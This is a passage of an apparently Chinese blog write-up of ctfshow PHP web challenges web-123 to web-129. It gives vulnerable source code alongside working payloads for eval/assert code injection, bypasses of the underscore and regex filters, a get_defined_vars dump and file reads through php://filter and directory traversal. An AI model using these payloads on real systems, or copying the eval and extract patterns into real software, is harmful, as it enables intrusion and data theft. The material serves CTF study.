<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php">两种方法：利用<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$c</span>&quot;</span>.<span class="hljs-string">&quot;;&quot;</span>); 或<span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>; <br><br>利用<span class="hljs-keyword">eval</span>函数输出flag<br>post：CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=<span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span><br><br><br><br>前置知识：<br><span class="hljs-variable">$_SERVER</span> 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。<br><span class="hljs-string">&#x27;argv&#x27;</span><br>    传递给该脚本的参数的数组。当脚本以命令行方式运行时，argv 变量传递给程序 C 语言样式的命令行参数。当通过 GET 方式调用时，该变量包含query <span class="hljs-keyword">string</span>。 <br>即<span class="hljs-variable">$_SERVER</span>[‘argv’][<span class="hljs-number">0</span>] = <span class="hljs-variable">$_SERVER</span>[‘QUERY_STRING’]=（get传参？后面的值）<br>例如：<br>?<span class="hljs-variable">$fl0g</span>=flag_give_me;   <span class="hljs-comment">//get</span><br><span class="hljs-variable">$_SERVER</span>[‘argv’][<span class="hljs-number">0</span>]=<span class="hljs-variable">$_SERVER</span>[‘QUERY_STRING’]=<span class="hljs-string">&quot;<span class="hljs-subst">$fl0g</span>=flag_give_me;&quot;</span><br><br><br><br>利用下面的<span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>来输出flag<br>当GET方式传入 赋值的语句<span class="hljs-variable">$fl0g</span>=flag_give_me;时<br><span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]=<span class="hljs-variable">$_SERVER</span>[‘argv’][<span class="hljs-number">0</span>]=<span class="hljs-string">&quot;<span class="hljs-subst">$fl0g</span>=flag_give_me;&quot;</span><br><br><br>?<span class="hljs-variable">$fl0g</span>=flag_give_me;                           <span class="hljs-comment">#GET  </span><br>CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>])      <span class="hljs-comment">#POST  </span><br><br>这里就相当于<span class="hljs-keyword">eval</span>(<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$fl0g</span>=flag_give_me;))<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="GET-POST传递变量特性（-）"><a href="#GET-POST传递变量特性（-）" class="headerlink" title="GET&#x2F;POST传递变量特性（[）"></a>GET&#x2F;POST传递变量特性（[）</h3><p>在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候都将空格、[，+、点转换为下划线，而传入[之后后面的空格、[，+、点就不会被转为下划线了</p>
<hr>
<h3 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h3><p><strong>$_SERVER[‘argv’]：传递给脚本的参数数组。</strong></p>
<p><strong>命令行情况下，$_SERVER[‘argv’][0]第一个元素是脚本的文件名（test.php），之后的元素是传递给脚本的参数（test1、test2）<br>在这里插入图片描述<br>web网页模式下，$arg只接受GET传参，且必须在php.ini开启register_argc_argv配置项。$_SERVER[‘argv’][0] &#x3D; $_SERVER[‘QUERY_STRING’] &#x3D; GET传参的值（?后面的），关于$_SERVER[‘QUERY_STRING’]</strong></p>
<hr>
<h2 id="web-124（highlight-file、-、get传参、arg）"><a href="#web-124（highlight-file、-、get传参、arg）" class="headerlink" title="web-124（highlight_file、[、get传参、arg）"></a>web-124（highlight_file、[、get传参、arg）</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>];<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;fun&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fl0g&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;</span>, <span class="hljs-variable">$c</span>)&amp;&amp;<span class="hljs-variable">$c</span>&lt;=<span class="hljs-number">16</span>)&#123;<br>         <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$c</span>&quot;</span>.<span class="hljs-string">&quot;;&quot;</span>);<br>         <span class="hljs-keyword">if</span>(<span class="hljs-variable">$fl0g</span>===<span class="hljs-string">&quot;flag_give_me&quot;</span>)&#123;<br>             <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>         &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p>这里正则过滤掉了上题我们使用的echo，但是还可以使用<code>highlight_file</code>+get传参的形式来输出文件内容。然后依旧用<code>[</code>来绕过，会自动转换为下划线，然后后面的点就不会被转换</p>
<p>payload：</p>
<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">?<span class="hljs-number">1</span>=flag.php<br>post：CTF_SHOW=&amp;CTF[SHOW.COM=&amp;<span class="hljs-function"><span class="hljs-keyword">fun</span>=<span class="hljs-title">highlight_file</span><span class="hljs-params">($_GET[<span class="hljs-number">1</span>])</span></span><br><br>上题使用$_SERVER[<span class="hljs-string">&#x27;argv&#x27;</span>]构造的payload依然能用，因为没有过滤eval<br><br>?$fl0g=flag_give_me;                        <br>POST：CTF_SHOW=&amp;CTF[SHOW.COM=&amp;<span class="hljs-function"><span class="hljs-keyword">fun</span>=<span class="hljs-title">eval</span><span class="hljs-params">($a[<span class="hljs-number">0</span>])</span></span>       <br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-126（assert、arg）"><a href="#web-126（assert、arg）" class="headerlink" title="web-126（assert、arg）"></a>web-126（assert、arg）</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>];<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;fun&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fl0g&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;</span>, <span class="hljs-variable">$c</span>) &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">16</span>)&#123;<br>         <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$c</span>&quot;</span>.<span class="hljs-string">&quot;;&quot;</span>);  <br>         <span class="hljs-keyword">if</span>(<span class="hljs-variable">$fl0g</span>===<span class="hljs-string">&quot;flag_give_me&quot;</span>)&#123;<br>             <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>         &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p><strong>这里有多过滤了几个字母，所以用highlight_file输出的方法不能用了，但是还是可以使用上题另一种payload</strong><br><strong>，这里还可以使用assert()来对$fl0g进行赋值。assert()相当于eval()，他能将字符串当做php代码来执行，且assert不需要严格遵从语法，比如末尾的分号可以不加。</strong></p>
<p>payload：</p>
<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">使用assert()和$_SERVER<br><br>?$fl0g=flag_give_me 	<span class="hljs-comment">//这里可以不用分号</span><br>POST：CTF_SHOW=&amp;CTF[SHOW.COM=&amp;<span class="hljs-function"><span class="hljs-keyword">fun</span>=<span class="hljs-title">assert</span><span class="hljs-params">($a[<span class="hljs-number">0</span>])</span></span>	<br><br>使用上题的payload<br>?$fl0g=flag_give_me;                        <br>POST：CTF_SHOW=&amp;CTF[SHOW.COM=&amp;<span class="hljs-function"><span class="hljs-keyword">fun</span>=<span class="hljs-title">eval</span><span class="hljs-params">($a[<span class="hljs-number">0</span>])</span></span>      <br></code></pre></td></tr></table></figure>

<hr>
<h3 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h3><p><strong>相当于eval()，也是危险函数，他能将其中的字符串当做php代码来执行，且assert不需要严格遵从语法，比如末尾的分号可以不加。</strong></p>
<hr>
<h2 id="web-127（extract-、-SERVER-‘QUERY-STRING’-）"><a href="#web-127（extract-、-SERVER-‘QUERY-STRING’-）" class="headerlink" title="web-127（extract()、$_SERVER[‘QUERY_STRING’]）"></a>web-127（extract()、$_SERVER[‘QUERY_STRING’]）</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$ctf_show</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$flag</span>);<br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br><br><br><span class="hljs-comment">//特殊字符检测</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="hljs-variable">$url</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$url</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;嗯哼？&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ctf_show</span>===<span class="hljs-string">&#x27;ilove36d&#x27;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p><strong>&#96;这里我们要让$ctf_show这个变量全等于’ilove36d’才能输出flag，所以我们可以利用extract()函数，该函数可以用于将数组中的键值对转换为变量和其对应的值，我们传入?ctf_show&#x3D;ilove36d，就会使$ctf_show&#x3D;ilove36d。</strong></p>
<p><strong>然后这里不能直接使用<code>_</code>下划线，被正则过滤了，所以要使用绕过，因为[、.点、+都被过滤了只能用空格绕过了</strong><br><strong><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>获取的是GET传参数据（<code>?</code>后面的键值），此时<code>%20(空格)</code>没有被转化为<code>_</code>；只有<code>$_GET</code>获取变量的时候，因为变量名不符合规范，<code>%20(空格)</code>才会被转换为<code>_</code>。</strong></p>
<p>payload：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?ctf%<span class="hljs-attribute">20show</span>=ilove36d<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="extract"><a href="#extract" class="headerlink" title="extract()"></a>extract()</h3><p>PHP extract()函数从<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%95%B0%E7%BB%84/0?fromModule=lemma_inlink">数组</a>中把<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%8F%98%E9%87%8F/0?fromModule=lemma_inlink">变量</a>导入到当前的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%AC%A6%E5%8F%B7%E8%A1%A8/0?fromModule=lemma_inlink">符号表</a>中。 </p>
<p>对于数组中的每个元素，键名用于变量名，键值用于<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%8F%98%E9%87%8F%E5%80%BC/8414141?fromModule=lemma_inlink">变量值</a>。</p>
<p>第二个参数 type 用于指定当某个变量已经存在，而数组中又有同名元素时，extract()函数如何对待这样的冲突。</p>
<p>本函数返回成功设置的变量数目。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">语法：<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-keyword">array</span>,extract_rules,prefix)<br><br>例子<br><span class="hljs-variable">$my_array</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;a&quot;</span> =&gt; <span class="hljs-string">&quot;Cat&quot;</span>,<span class="hljs-string">&quot;b&quot;</span> =&gt; <span class="hljs-string">&quot;Dog&quot;</span>, <span class="hljs-string">&quot;c&quot;</span> =&gt; <span class="hljs-string">&quot;Horse&quot;</span>);<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$my_array</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\$a = <span class="hljs-subst">$a</span>; \$b = <span class="hljs-subst">$b</span>; \$c = <span class="hljs-subst">$c</span>&quot;</span>;<span class="hljs-meta">?&gt;</span><br>输出：<br><span class="hljs-variable">$a</span> = Cat; <span class="hljs-variable">$b</span> = Dog; <span class="hljs-variable">$c</span> = Horse<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="SERVER-‘QUERY-STRING’"><a href="#SERVER-‘QUERY-STRING’" class="headerlink" title="$_SERVER[‘QUERY_STRING’]"></a>$_SERVER[‘QUERY_STRING’]</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_49480008/article/details/115872899">https://blog.csdn.net/qq_49480008/article/details/115872899</a></p>
<p><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>获取的是GET传参数据（<code>?</code>后面的键值）</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">例如：<br>?<span class="hljs-attribute">ctf_show</span>=123<br><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br>echo <span class="hljs-variable">$a</span>;<br><br>输出<br><span class="hljs-string">&#x27;ctf_show=123&#x27;</span><br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-128（gettext-、get-defined-vars-）"><a href="#web-128（gettext-、get-defined-vars-）" class="headerlink" title="web-128（gettext()、get_defined_vars()）"></a>web-128（gettext()、get_defined_vars()）</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$f1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f1&#x27;</span>];<br><span class="hljs-variable">$f2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f2&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$f1</span>))&#123;<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$f1</span>,<span class="hljs-variable">$f2</span>)));<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;嗯哼？&quot;</span>;<br>&#125;<br><br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="hljs-variable">$str</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p><strong>_() 函数即 gettext() 函数，可以将参数翻译成指定语言，一般就是原封不动的输出参数</strong></p>
<p><strong>get_defined_vars 函数可以输出所有变量的信息，两者结合拿到 flag</strong></p>
<p><strong>首先在第一个call_user_func回调函数内，_()即被回调的参数，然后get_defined_vars为参数，_()会将get_defined_vars输出，接着又是一个call_user_func回调函数执行get_define_vars然后外面的var_dump会将其结果输出，这样就能拿到flag了</strong></p>
<p>payload：</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">?<span class="hljs-built_in">f1</span><span class="hljs-symbol">=_</span>&amp;<span class="hljs-built_in">f2</span><span class="hljs-symbol">=get_defined_vars</span><br></code></pre></td></tr></table></figure>

<hr>
<h3 id="gettext"><a href="#gettext" class="headerlink" title="gettext"></a>gettext</h3><p><strong>_() 函数即 gettext() 函数，可以将参数翻译成指定语言，一般就是原封不动的输出参数</strong></p>
<p><strong>string gettext( string $message) 返回输入的字符</strong><br><strong>_()&#x3D;&#x3D;gettext() 是gettext()的拓展函数，开启text扩展，_是gettext的别名。需要php扩展目录下有php_gettext.dll</strong></p>
<p><strong>echo gettext(“Welcome to My PHP Application”);</strong></p>
<hr>
<h3 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h3><p><strong>get_defined_vars — 返回由所有已定义变量所组成的数组</strong></p>
<hr>
<h2 id="web-129（stripos-、php伪协议-嵌套无效协议-、目录穿越）"><a href="#web-129（stripos-、php伪协议-嵌套无效协议-、目录穿越）" class="headerlink" title="web-129（stripos()、php伪协议(嵌套无效协议)、目录穿越）"></a>web-129（stripos()、php伪协议(嵌套无效协议)、目录穿越）</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$f</span>, <span class="hljs-string">&#x27;ctfshow&#x27;</span>)&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$f</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p>这里有一个stripos函数，会匹配我们GET方法传入的值，如果其中存在’ctfshow’字符串，就会echo readfile($f)，所以我们的payload中必须含有ctfshow，且不能影响读取。这里有两种做法，一种是php伪协议嵌套无效协议，第二种就是目录穿越，相当于进入ctfshow文件夹又跳出，然后访问flag.php</p>
<p>payload：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">php伪协议在遇到无效协议时，会自动忽略。<br>?<span class="hljs-attribute">f</span>=php://filter/ctfshow/resource=flag.php<br><br>目录穿越<br>?<span class="hljs-attribute">f</span>=./ctfshow/../flag.php<br></code></pre></td></tr></table></figure>

<p>注意：两种方法都需要查看源代码才能看到flag</p>
<hr>
<h3 id="stripos"><a href="#stripos" class="headerlink" title="stripos()"></a>stripos()</h3><p>stripos</p>
<p>注意：如果参数为数组，直接输出null</p>
<figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs erlang"><span class="hljs-function"><span class="hljs-title">stripos</span> </span><br><span class="hljs-function"><span class="hljs-params">(PHP <span class="hljs-number">5</span>, PHP <span class="hljs-number">7</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">stripos</span> — 查找字符串首次出现的位置（不区分大小写）</span><br><span class="hljs-function">说明 </span><br><span class="hljs-function"><span class="hljs-title">mixed</span> <span class="hljs-title">stripos</span><span class="hljs-params">( string <span class="hljs-string">$h</span>aystack, string <span class="hljs-string">$n</span>eedle[, int <span class="hljs-string">$o</span>ffset = <span class="hljs-number">0</span>] )</span></span><br><span class="hljs-function">返回在字符串 <span class="hljs-title">haystack</span> 中 <span class="hljs-title">needle</span> 首次出现的数字位置。 </span><br><span class="hljs-function">与 <span class="hljs-title">strpos</span><span class="hljs-params">()</span> 不同，<span class="hljs-title">stripos</span><span class="hljs-params">()</span> 不区分大小写。 </span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function">参数 </span><br><span class="hljs-function"><span class="hljs-title">haystack</span></span><br><span class="hljs-function">在该字符串中查找。 </span><br><span class="hljs-function"><span class="hljs-title">needle</span></span><br><span class="hljs-function">注意 <span class="hljs-title">needle</span> 可以是一个单字符或者多字符的字符串。 </span><br><span class="hljs-function">如果 <span class="hljs-title">needle</span> 不是一个字符串，那么它将被转换为整型并被视为字符顺序值。 </span><br><span class="hljs-function"><span class="hljs-title">offset</span></span><br><span class="hljs-function">可选的 <span class="hljs-title">offset</span> 参数，从字符此数量的开始位置进行搜索。如果是负数，就从字符末尾此数量的字符数开始统计。 </span><br><span class="hljs-function"></span><br><span class="hljs-function">返回值 </span><br><span class="hljs-function">返回 <span class="hljs-title">needle</span> 存在于 <span class="hljs-title">haystack</span> 字符串开始的位置<span class="hljs-params">(独立于偏移量)</span>。同时注意字符串位置起始于 0，而不是 1。 </span><br><span class="hljs-function">如果未发现 <span class="hljs-title">needle</span> 将返回 FALSE。 </span><br></code></pre></td></tr></table></figure>

<hr>
<h3 id="readfile"><a href="#readfile" class="headerlink" title="readfile()"></a>readfile()</h3><p>readfile</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$filename</span>, <span class="hljs-keyword">bool</span> <span class="hljs-variable">$use_include_path</span> = <span class="hljs-literal">false</span>, resource <span class="hljs-variable">$context</span> = ?): <span class="hljs-keyword">int</span><br> 读取文件并写入到输出缓冲。 <br> <br>参数<br>filename<br>    要读取的文件名。<br>use_include_path<br>    想要在 include_path 中搜索文件，可使用这个可选的第二个参数，设为 <span class="hljs-literal">true</span>。<br>context<br>    Stream 上下文（context） resource。<br>返回值<br>成功时返回从文件中读入的字节数， 或者在失败时返回 <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure>

<hr>
<h3 id="php伪协议嵌套无效协议"><a href="#php伪协议嵌套无效协议" class="headerlink" title="php伪协议嵌套无效协议"></a>php伪协议嵌套无效协议</h3><p>php伪协议在遇到无效协议时，会自动忽略。</p>
<p>当我们的伪协议中需要包含一些内容，但又不影响我们的读取，就可以使用这种方法</p>
<p>例如：</p>
